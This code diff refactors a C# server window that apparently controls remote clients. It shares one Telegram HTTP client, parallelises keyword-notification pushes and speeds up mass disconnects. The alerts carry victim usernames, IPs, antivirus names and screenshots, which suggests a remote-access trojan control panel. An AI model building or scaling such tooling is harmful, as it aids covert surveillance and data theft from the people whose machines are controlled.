@@ -99,6 +99,9 @@ public partial class ServerWindow : ThemedWindow
         return b2;
     }
 
+    // Shared HttpClient for all Telegram API calls — avoids socket exhaustion from new HttpClient() per alert.
+    private static readonly System.Net.Http.HttpClient _telegramHttp = new() { Timeout = TimeSpan.FromSeconds(15) };
+
     private static readonly HashSet<string> _lightThemeKeys = new(StringComparer.Ordinal)
     {
         "VS2017Light", "Seven",
@@ -640,19 +643,18 @@ public partial class ServerWindow : ThemedWindow
                 try { jpegBytes = Convert.FromBase64String(data.Screenshot); } catch { }
             }
 
-            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(15) };
             foreach (var id in targets)
             {
                 try
                 {
                     if (jpegBytes != null && jpegBytes.Length > 0)
-                        await TelegramSendPhotoAsync(http, token, id, jpegBytes, caption);
+                        await TelegramSendPhotoAsync(_telegramHttp, token, id, jpegBytes, caption);
                     else
                     {
                         var url = $"https://api.telegram.org/bot{token}/sendMessage" +
                                   $"?chat_id={Uri.EscapeDataString(id)}" +
                                   $"&text={Uri.EscapeDataString(caption)}";
-                        await http.GetAsync(url);
+                        await _telegramHttp.GetAsync(url);
                     }
                 }
                 catch { }
@@ -695,9 +697,11 @@ public partial class ServerWindow : ThemedWindow
                 if (clients.Count > 0)
                 {
                     if (enabled)
-                        _ = Task.Run(async () => { foreach (var id in clients) await SendWindowNotifyKeywords(id); });
+                        _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
+                            async (id, _) => await SendWindowNotifyKeywords(id)));
                     else
-                        _ = Task.Run(async () => { foreach (var id in clients) await SendEmptyWinNotifyKeywords(id); });
+                        _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
+                            async (id, _) => await SendEmptyWinNotifyKeywords(id)));
                 }
             }
         }
@@ -776,7 +780,6 @@ public partial class ServerWindow : ThemedWindow
                 $"AV: {c.Antivirus}\n" +
                 $"Time: {paris}";
 
-            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(10) };
             var targets = new List<string> { chatId1 };
             if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);
 
@@ -787,7 +790,7 @@ public partial class ServerWindow : ThemedWindow
                     var url = $"https://api.telegram.org/bot{token}/sendMessage" +
                               $"?chat_id={Uri.EscapeDataString(id)}" +
                               $"&text={Uri.EscapeDataString(msg)}";
-                    await http.GetAsync(url);
+                    await _telegramHttp.GetAsync(url);
                 }
                 catch { }
             }
@@ -1449,12 +1452,14 @@ public partial class ServerWindow : ThemedWindow
             ? $"Disconnect '{clients[0].Username}@{clients[0].IP}'?"
             : $"Disconnect {clients.Count} clients?";
         if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
-        foreach (var client in clients)
+        // Parallel disconnect — send Disconnect packet then wait 150ms before force-removing,
+        // all clients run concurrently so N clients take ~150ms total instead of N×150ms.
+        await Task.WhenAll(clients.Select(async client =>
         {
             try { await _server.SendToClient(client.Id, new Packet { Type = PacketType.Disconnect }); } catch { }
             await Task.Delay(150);
             _server.DisconnectClient(client.Id);
-        }
+        }));
     }
 
     // ── Column width persistence ──────────────────────────────────────────────
